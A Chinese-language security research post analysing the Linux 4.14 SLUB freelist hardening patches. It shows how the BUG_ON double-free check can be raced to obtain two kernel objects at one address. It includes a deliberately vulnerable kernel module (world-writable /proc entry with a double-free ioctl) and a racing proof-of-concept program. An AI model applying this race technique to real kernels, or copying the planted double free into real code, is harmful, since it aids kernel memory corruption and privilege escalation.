---
layout: post
author: zerons, Shawn
title:  "Linux kernel 4.14 SLAB_FREELIST_HARDENED 简单分析"
summary: 对Linux Kernel 4.14的SLAB_FREELIST_HARDENED加固实现的部分分析

categories: system-security
---

by zerons, Shawn


# 对Linux Kernel 4.14.0的SLAB_FREELIST_HARDENED加固实现的部分分析

在之前的文档[linux kernel double-free类型漏洞的利用](https://github.com/snorez/blog/blob/master/linux%20kernel%20double-free%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8.md)中提到了SLUB的一个特性后进先出(LIFO), 在slub中实现了一个单向链表, 每个节点的下一个元素保存在这个节点指向的内存的一个偏移处(kmem_cache->offset). 在double free环境中, 导致这个链表出现一个环, 于是后续的申请能得到指向同一个空间的两个对象.

本文会介绍一种由补丁引起的另外一种可利用的思路(只适用一种场景).

---
### 本文讨论的相关补丁
+ PATCH 0: [add a naive detection of double free or corruption](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ce6fa91b93630396ca220c33dd38ffc62686d499)
+ PATCH 1: [add SLUB free list pointer obfuscation](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2482ddec)

	Shawn: SLAB_FREELIST_HARDENED中最重要的特性, 来自于2016年PaX/Grsecurity针对v4.8内核的代码
+ PATCH 2: [prefetch next freelist pointer in slab_alloc](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0ad9500e1)

##### PATCH 0
在`set_freepointer(struct kmem_cache *s, void *object, void *fp)`函数中, 添加一个检测
```c
BUG_ON(object == fp);
```
在kfree的时候, object为将要释放的地址, fp来源于page结构体中的freelist成员, freelist指向当前可用的空间的地址.

BUG_ON检测的条件就是如果freelist指向了当前要释放的空间, 即产生崩溃(CONFIG_PANIC_ON_OOPS)/终止触发的进程(no panic_on_oops)

对这个补丁后面会详细说明.

##### PATCH 1
这个补丁修改了保存在每个释放的空间的数据, 也就是freelist那个链表不再是直接取数据就能用的, 需要进行逆运算才能得到下一个空间的地址. 运算过程在freelist_ptr函数中
```c
static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
				 unsigned long ptr_addr)
{
#ifdef CONFIG_SLAB_FREELIST_HARDENED
	return (void *)((unsigned long)ptr ^ s->random ^ ptr_addr);
#else
	return ptr;
#endif
}
```
参数s通常来源于kmalloc_caches这个全局数组对应偏移, 比如kmalloc-8192的数组索引为13(2的13次方). random成员在`kmem_cache_open`函数中赋值.

##### PATCH 2
这个补丁, 很早就加入了系统(2011年?)
```c
static inline void *freelist_dereference(const struct kmem_cache *s,
					 void *ptr_addr)
{
	return freelist_ptr(s, (void *)*(unsigned long *)(ptr_addr),
			    (unsigned long)ptr_addr);
}

static void prefetch_freepointer(const struct kmem_cache *s, void *object)
{
	if (object)
		prefetch(freelist_dereference(s, object + s->offset));
}
```
当object不为空的时候, 检测object的下一个可用成员是否合法.


---
### 回到double free的环境
这里考虑如下的double free环境, 在一个线程中运行了如下的代码
```c
kfree(a);
kfree(b);
kfree(a);
```
在执行完成之后, 会有下面的一个'环'
```c
freelist = a
*(unsigned long *)a = b;
*(unsigned long *)b = a;
```
按照之前的利用思路, 那么当

申请到a对象的时候, freelist=b

申请到b对象的时候, freelist=a?

这个地方其实就会出问题了. 由于我们并不能保证 ***申请的对象不写任何空间*** , 尤其是(s->offset)位置的数据. 假设我们用kzalloc函数申请到了a, 在申请对象b的时候

在函数slab_alloc_node中
```c
static __always_inline void *slab_alloc_node(struct kmem_cache *s,
		gfp_t gfpflags, int node, unsigned long addr)
{
	void *object;
	struct kmem_cache_cpu *c;
	struct page *page;
	unsigned long tid;

	/* ... */
	object = c->freelist;
	page = c->page;
	if (unlikely(!object || !node_match(page, node))) {
		/* ... */
	} else {
		void *next_object = get_freepointer_safe(s, object);

		/* ... */
		/*
		 * 在这个地方调用了prefetch_freepointer
		 * next_object即为a
		 */
		prefetch_freepointer(s, next_object);
		stat(s, ALLOC_FASTPATH);
	}

	/* ... */

	return object;
}
```
在prefetch_freepointer中, object为a, 但是此时`*(unsigned long *)a`的值为0.

然后在freelist_ptr时, ptr为保存在a中的xor值(此时为0), ptr_addr值为a, 运算得到下一个对象的地址就乱了, 通常会是一个非法地址.

至此, 这种利用方法被这两种方法挡住了.


### 回到PATCH 0
**由于多数发行版未开启panic_on_oops, 下面的讨论只在没有panic_on_oops情况下有效**

这个补丁原本是用于检测一些double free的bug的. 但是它存在一些竞争, 导致一些意外情况.

补丁只能检测在一个线程中连续执行`kfree(a) kfree(a)`的情况, 即类似cve-2017-2636的情况

回到补丁上, fp是freelist的值, object是当前准备释放的地址.

如果在第一次kfree(a)之后, 另外的线程获得了执行, 然后执行kfree(b)(b需要相当接近a)修改了freelist的值, 那么就可以造成类似`kfree(a) kfree(b) ... kfree(a)`的情况, 补丁并没起作用.

同样, 在第一次kfree(a)之后, 另外的线程获得了执行, 然后执行了kmalloc修改了freelist的值, 那么就如同`kfree(a) kmalloc()->a, kfree(a), kmalloc()->a`的情况. ***获得指向同一个地址的两个对象***

问题在于, 补丁使用了BUG_ON, 使得用户空间程序可以检测内核的某种状态, 当其他的线程能竞争成功的时候, 触发double-free的线程得以成功退出.

那么也就成了, 这个补丁原本是为了检测什么类型的漏洞, 导致这种漏洞是有可能来利用的, 毕竟它允许我们一直竞争下去直到成功竞争..(测试中kfree竞争kfree相对比较容易, 通常几秒得到. 用kmalloc来竞争kfree, 比较难得到).


##### 一个猜想
在未开启panic_on_oops的场景下, 内核代码中使用了挺多的BUG_ON, 会不会有其他的检测的condition会存在类似的竞争情况呢?


### 纵深防御
Shawn: 不论是use-after-free，double free还是race condition导致的任意执行和读写，单一的防御是远远不够的，PATCH 0是一个典型的例子，即使在[通用的PaX/Grsecurity加固](https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/kernel_mitigation.md)方案在这个case中有多个防御机制等待突破，而其中至少有4个防御机制形成了盾牌链条。


### 测试用例
测试用例主要是演示这种情景, [演示视频](https://www.youtube.com/watch?v=xdSPu5IYTGk)

mod_test.c
```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/uaccess.h>

#define	TARGET_SLAB_SIZE	8192
struct test_ll {
	struct list_head sibling;
	char *buf;
	int flag;
};

static int test_file_open(struct inode *ino, struct file *filp)
{
	if (likely(!filp->private_data)) {
		filp->private_data = kmalloc(sizeof(struct list_head), GFP_KERNEL);
		if (!filp->private_data)
			return -ENOMEM;
		INIT_LIST_HEAD(filp->private_data);
	}
	return 0;
}

static long test_file_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
	switch (cmd) {
	case 0xa1:	/* create node */
	{
		struct test_ll *new;
		new = kzalloc(sizeof(*new), GFP_KERNEL);
		if (!new)
			return -ENOMEM;

		new->buf = kzalloc(TARGET_SLAB_SIZE, GFP_KERNEL);
		if (!new->buf) {
			kfree(new);
			return -ENOMEM;
		}

		list_add_tail(&new->sibling, filp->private_data);
		return (long)new->buf;
	}
	case 0xa2:	/* add a same node to the tail */
	{
		struct test_ll *new, *tail;
		new = kzalloc(sizeof(*new), GFP_KERNEL);
		if (!new)
			return -ENOMEM;

		tail = container_of(((struct list_head *)filp->private_data)->prev,
					struct test_ll, sibling);
		new->buf = tail->buf;
		tail->flag = 1;
		list_add_tail(&new->sibling, filp->private_data);
		return (long)new->buf;
	}
	case 0xa3:	/* double free */
	{
		struct list_head *head = (struct list_head *)filp->private_data;
		struct test_ll *tmp, *next;
		unsigned long i = 0;

		list_for_each_entry_safe(tmp, next, head, sibling) {
			list_del(&tmp->sibling);
			kfree(tmp->buf);
			if (unlikely(tmp->flag))
				msleep(1);
			kfree(tmp);
		}
		kfree(filp->private_data);
		return 0;
	}
	default:
		return -EINVAL;
	}
}

struct file_operations test_ops = {
	.owner = THIS_MODULE,
	.open = test_file_open,
	.unlocked_ioctl = test_file_ioctl,
};
static struct proc_dir_entry *test_entry;

static int __init test_init(void)
{
	test_entry = proc_create("test_double-free", S_IRUSR | S_IWUSR | S_IROTH |
					S_IWOTH, NULL, &test_ops);
	if (!test_entry) {
		pr_err("proc_create err\n");
		return -1;
	}


	return 0;
}

static void __exit test_exit(void)
{
	proc_remove(test_entry);
	return;
}

MODULE_LICENSE("GPL");
module_init(test_init);
module_exit(test_exit);
```
poc.c
```c
#define	_GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/tty.h>
#include <termios.h>
#include <syscall.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <pthread.h>

static char *target_path = "/proc/test_double-free";
#define	fd_cnt 1
#define	alloc_times 0x100
int fd[fd_cnt];

int open_target_file(void)
{
	return open(target_path, O_RDWR);
}

int alloc_8192_buf(int fd)
{
	return ioctl(fd, 0xa1, NULL);
}

int add_same_buf(int fd)
{
	return ioctl(fd, 0xa2, NULL);
}

int do_double_free(int fd)
{
	return ioctl(fd, 0xa3, NULL);
}

int do_release(int fd)
{
	return ioctl(fd, 0xa3, NULL);
}

#define	BUF_PER_FD	0x1000
#define	THREADS_RACE	0x10
int buf_fd[THREADS_RACE];
int addr[BUF_PER_FD * THREADS_RACE];
void *thread_alloc_buf(void *arg)
{
	int idx = (int)arg;
	int i = 0;
	int start = idx * BUF_PER_FD;
	int end = (idx + 1) * BUF_PER_FD;
	for (int i = start; i < end; i++) {
		addr[i] = alloc_8192_buf(buf_fd[idx]);
	}
	return (void *)0;
}

int main(int argc, char *argv[])
{
	int err;

	int i = 0;
	while (1) {
		for (i = 0; i < THREADS_RACE; i++)
			buf_fd[i] = open_target_file();

		int pid;
		if ((pid = fork()) < 0) {
			perror("fork");
		} else if (pid == 0) {
			for (i = 0; i < fd_cnt; i++)
				fd[i] = open_target_file();

			for (i = 0; i < fd_cnt; i++)
				for (int j = 0; j < alloc_times; j++)
					alloc_8192_buf(fd[i]);
			err = add_same_buf(fd[0]);
			fprintf(stderr, "double free at: %x\n", err);
			do_double_free(fd[0]);
			return 0;
		}
		int pid_status;
		pthread_t thread[THREADS_RACE];
		for (i = 0; i < THREADS_RACE; i++) {
			err = pthread_create(&thread[i], NULL,
						thread_alloc_buf,
						(void *)i);
			if (err == -1)
				thread[i] = NULL;
		}
		for (i = 0; i < THREADS_RACE; i++)
			pthread_join(thread[i], NULL);

		waitpid(pid, &pid_status, 0);
		if (WIFEXITED(pid_status)) {
			fprintf(stdout, "child ret: %d\n", pid_status);
			break;
		}

		for (i = 0; i < THREADS_RACE; i++) {
			do_release(buf_fd[i]);
			close(buf_fd[i]);
		}
	}

	for (i = 0; i < THREADS_RACE * BUF_PER_FD; i++) {
		fprintf(stderr, "%d: %x\n", i, addr[i]);
	}
	getchar();

	for (i = 0; i < THREADS_RACE; i++) {
		do_release(buf_fd[i]);
		close(buf_fd[i]);
		buf_fd[i] = -1;
	}

	return 0;
}
```
